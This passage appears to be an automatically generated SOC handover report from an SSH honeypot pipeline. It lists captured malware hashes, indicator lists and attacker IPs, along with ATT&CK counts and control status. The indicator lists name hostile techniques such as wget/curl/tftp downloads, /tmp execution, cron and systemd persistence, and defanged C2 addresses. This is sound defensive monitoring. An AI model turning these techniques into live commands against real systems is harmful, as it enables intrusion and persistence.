| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `43.110.31[.]0` | US | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 2 |
| `172.173.200[.]62` | US | Microsoft Limited | **100** ⚠️ | 50 |
| `176.98.155[.]63` | RU | Aliev Magomed Kadievich | **100** ⚠️ | 7 |
| `183.232.212[.]207` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `18.116.101[.]220` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `40.124.187[.]35` | US | Microsoft Corporation | **100** ⚠️ | 10 |
| `103.255.200[.]90` | CN | Bei Jing Cloud Times Technology Co.,Ltd | **100** ⚠️ | 23 |
| `39.98.202[.]253` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 5 |
| `3.129.187[.]38` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `118.145.228[.]55` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 29 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 354 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 299 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 141 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 110 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 41 |

---

## 🔕 False Positive Summary (58 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 16 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 10 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| AbuseIPDB score 8 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 34 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 514 cases |
| Tool 34  | Credential Extractor        | ✅ 2813 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 30 fingerprints |
| Tool 36  | Command Clustering          | ✅ 50 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 300 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 58 filtered (11.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 142 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 294 priority case(s) shown individually · 145 recon entry/entries in table (12 group(s) consolidating 29 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-29T17:48:25Z_
